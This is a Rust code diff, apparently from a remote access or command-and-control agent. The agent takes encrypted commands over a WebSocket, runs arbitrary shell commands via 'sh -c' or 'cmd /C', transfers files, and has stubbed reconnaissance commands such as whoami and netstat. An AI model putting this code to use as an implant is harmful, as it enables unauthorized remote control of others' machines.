@@ -8,6 +8,7 @@ use tokio_tungstenite::tungstenite::Message;
 use tokio_tungstenite::WebSocketStream;
 use crate::communication;
 use crate::command::{Command as NodeCommand, Response};
+use crate::response_handler;
 
 pub struct RxCommandHandler {
     passphrase: String,
@@ -27,6 +28,12 @@ impl RxCommandHandler {
     pub async fn handle_command(&mut self, command: NodeCommand) -> Response {
         match command {
             NodeCommand::Echo { message } => self.echo_message(&message).await,
+            NodeCommand::Info => self.info().await,
+            NodeCommand::Whoami => self.whoami().await,
+            NodeCommand::Pwd => self.pwd().await,
+            NodeCommand::Users => self.users().await,
+            NodeCommand::Netstat => self.netstat().await,
+            NodeCommand::Network => self.network().await,
             NodeCommand::ListFiles => self.list_files().await,
             NodeCommand::GetFile { file_path, file_local_path } => self.download_file(&file_path, &file_local_path).await,
             NodeCommand::PutFile { file_path, file_up_path, data } => self.upload_file(&file_path, &file_up_path, &data).await,
@@ -39,6 +46,31 @@ impl RxCommandHandler {
         println!("{}", message);
         Response::Message { content: format!("[+] {}", message) }
     }
+
+    async fn info(&self) -> Response {
+        Response::Message { content: "NOT IMPLEMENTED".to_string() }
+    }
+
+    async fn pwd(&self) -> Response {
+        Response::Message { content: "NOT IMPLEMENTED".to_string() }
+    }
+
+    async fn users(&self) -> Response {
+        Response::Message { content: "NOT IMPLEMENTED".to_string() }
+    }
+
+    async fn netstat(&self) -> Response {
+        Response::Message { content: "NOT IMPLEMENTED".to_string() }
+    }
+
+    async fn network(&self) -> Response {
+        Response::Message { content: "NOT IMPLEMENTED".to_string() }
+    }
+
+    async fn whoami(&self) -> Response {
+        Response::Message { content: "NOT IMPLEMENTED".to_string() }
+    }
+
 
     async fn list_files(&self) -> Response {
         let mut file_list = vec![];
@@ -82,7 +114,20 @@ impl RxCommandHandler {
     }
 
     async fn execute_command(&self, command: &str) -> Response {
-        match Command::new("sh").arg("-c").arg(command).output().await {
+        let cmd_result = if cfg!(target_os = "windows") {
+            Command::new("cmd")
+                .args(&["/C", command])
+                .output()
+                .await
+        } else {
+            Command::new("sh")
+                .arg("-c")
+                .arg(command)
+                .output()
+                .await
+        };
+
+        match cmd_result {
             Ok(output) => {
                 let result = String::from_utf8_lossy(&output.stdout);
                 Response::CommandOutput { output: result.to_string() }
@@ -98,25 +143,7 @@ impl RxCommandHandler {
         self.passphrase = new_passphrase.to_string();
         Response::Message { content: "Passphrase changed successfully.".to_string() }
     }
-
-    async fn process_binary_message(&mut self, data: Vec<u8>) -> Result<(), String> {
-        let decrypted_data = communication::prepare_rx(data, &self.passphrase);
-
-        if let Ok(command) = serde_json::from_slice::<NodeCommand>(&decrypted_data) {
-            println!("Received command: {:?}", command);
-
-            let response = self.handle_command(command).await;
-            self.send_response(response).await;
-        }
-        else if let Ok(response) = serde_json::from_slice::<Response>(&decrypted_data) {
-            println!("Received response: {:?}", response);
-        } else {
-            return Err("Failed to deserialize message as either Command or Response".to_string());
-        }
-        Ok(())
-    }
     
-
     async fn send_response(&self, response: Response) {
         if let Some(ws_sender) = &self.ws_sender {
             let mut sender = ws_sender.lock().await;
@@ -125,12 +152,21 @@ impl RxCommandHandler {
             communication::send_binary_data(&mut sender, encrypted_response).await;
         }
     }
+
     pub async fn handle_rx(&mut self) {
         while let Some(message) = self.get_next_message().await {
             match message {
                 Ok(Message::Binary(data)) => {
-                    if let Err(e) = self.process_binary_message(data).await {
-                        eprintln!("Failed to process binary message: {}", e);
+                    let decrypted_data = communication::prepare_rx(data, &self.passphrase);
+                    
+                    if let Ok(command) = serde_json::from_slice::<NodeCommand>(&decrypted_data) {
+                        println!("Received command:\n {:?}", command);
+                        let response = self.handle_command(command).await;
+                        self.send_response(response).await;
+                    } else if let Ok(response) = serde_json::from_slice::<Response>(&decrypted_data) {
+                        response_handler::process_response(response).await;
+                    } else {
+                        eprintln!("Received unexpected message format.");
                     }
                 }
                 Ok(Message::Text(text)) => {
